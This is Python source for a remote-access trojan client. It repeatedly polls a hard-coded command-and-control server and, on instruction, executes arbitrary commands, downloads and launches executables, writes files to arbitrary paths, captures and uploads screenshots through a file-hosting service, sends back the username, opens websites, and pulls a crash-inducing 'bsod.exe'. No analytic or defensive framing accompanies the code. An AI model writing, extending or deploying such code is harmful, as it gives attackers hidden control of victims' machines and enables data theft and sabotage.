from requests import RequestException, Response, post, get
from subprocess import CREATE_NEW_CONSOLE, Popen
from PIL import UnidentifiedImageError, Image
from fleep import get as get_soundtype
from pyautogui import screenshot
from playsound import playsound
from os import remove, getenv
from threading import Thread
from base64 import b64decode
from os import getcwd, chdir
from random import choices
from time import sleep
from sys import exit


DELAY = 5
IP = "139.177.176.121"
PORT = 80
SCHEME = "http"
CONNECT_TIMEOUT = 5


def main() -> None:
    try:
        while True:
            get_commands_response = get(
                f"{SCHEME}://{IP}:{PORT}/command-center",
                timeout=CONNECT_TIMEOUT,
            )
            get_images_response = get(
                f"{SCHEME}://{IP}:{PORT}/image-center",
                timeout=CONNECT_TIMEOUT,
            )
            get_bsod_response = get(
                f"{SCHEME}://{IP}:{PORT}/bsod-center",
                timeout=CONNECT_TIMEOUT,
            )
            get_run_file_response = get(
                f"{SCHEME}://{IP}:{PORT}/runfile-center",
                timeout=CONNECT_TIMEOUT,
            )
            get_screenshot_file_response = get(
                f"{SCHEME}://{IP}:{PORT}/screenshot-center",
                timeout=CONNECT_TIMEOUT,
            )
            get_website_response = get(
                f"{SCHEME}://{IP}:{PORT}/website-center",
                timeout=CONNECT_TIMEOUT,
            )
            get_drop_file_response = get(
                f"{SCHEME}://{IP}:{PORT}/dropfile-center",
                timeout=CONNECT_TIMEOUT,
            )
            get_user_response = get(
                f"{SCHEME}://{IP}:{PORT}/getuser-center",
                timeout=CONNECT_TIMEOUT,
            )
            get_playsound_response = get(
                f"{SCHEME}://{IP}:{PORT}/playsound-center",
                timeout=CONNECT_TIMEOUT,
            )
            if get_commands_response.status_code == 200:
                run_command(get_commands_response)
            if get_images_response.status_code == 200:
                show_image(get_images_response)
            if get_bsod_response.status_code == 200:
                invoke_bsod()
            if get_run_file_response.status_code == 200:
                run_file(get_run_file_response.json())
            if get_screenshot_file_response.status_code == 200:
                post_screenshot()
            if get_website_response.status_code == 200:
                open_website(get_website_response.text)
            if get_drop_file_response.status_code == 200:
                drop_file(
                    get_drop_file_response.json().get("dropfile"),
                    get_drop_file_response.json().get("location"),
                )
            if get_user_response.status_code == 200:
                post_user()
            if get_playsound_response.status_code == 200:
                Thread(target=play_sound_thread, args=[get_playsound_response.content])
            sleep(DELAY)
    except RequestException:
        print("Failed to connect, retrying...")
        main()
    except KeyboardInterrupt:
        print("Goodbye...")
        sleep(1.5)
        exit()
    except Exception as error:
        print(error)
        main()


def play_sound_thread(soundfile_data: bytes) -> None:
    old_cd = getcwd
    chdir(getenv("temp"))
    sound_type = get_soundtype(soundfile_data).extension[0]
    filename = (
        f"{''.join(choices('abcdefghijklmnopqrstuvwxyz1234567890', k=5))}.{sound_type}"
    )
    with open(filename, "wb") as temp_file:
        temp_file.write(soundfile_data)
    playsound(filename, block=True)
    remove(filename)
    chdir(old_cd)


def post_user() -> None:
    post(f"{SCHEME}://{IP}:{PORT}/getuser-center?user={getenv('USERNAME')}")


def drop_file(content: str, location: str) -> None:
    with open(location, "wb") as dropped_file:
        dropped_file.write(b64decode(content))


def open_website(url: str) -> None:
    Popen(f'powershell -Command "start {url}"')


def post_screenshot() -> None:
    old_cd = getcwd()
    chdir(getenv("temp"))
    screenshot().save("temp.png", "png")
    upload_url = (
        "https://"
        + get("https://api.gofile.io/getServer").json().get("data").get("server")
        + ".gofile.io/uploadFile"
    )
    with open("temp.png", "rb") as temp_file:
        download_page: str = (
            post(upload_url, files={"file": temp_file})
            .json()
            .get("data")
            .get("downloadPage")
        )
    remove("temp.png")
    chdir(old_cd)
    post(f"{SCHEME}://{IP}:{PORT}/screenshot-center?download_page={download_page}")


def run_file(response_json: dict) -> None:
    old_cd = getcwd()
    chdir(getenv("temp"))
    with open("temp.exe", "wb") as temp_file:
        temp_file.write(b64decode(response_json.get("runfile")))
    Popen(
        f"temp.exe {response_json.get('args')}",
        creationflags=CREATE_NEW_CONSOLE,
    )
    chdir(old_cd)


def invoke_bsod() -> None:
    chdir(getenv("temp"))
    with open("temp.exe", "wb") as temp_file:
        temp_file.write(get(f"{SCHEME}://{IP}:{PORT}/bsod.exe").content)
    Popen("temp.exe")


def show_image(get_images_response: Response) -> None:
    with open("temp", "wb") as temp_image_file:
        temp_image_file.write(get_images_response.content)
    try:
        Image.open("temp").show()
    except UnidentifiedImageError:
        pass
    remove("temp")


def run_command(get_commands_response: Response) -> None:
    Popen(get_commands_response.text)


if __name__ == "__main__":
    main()
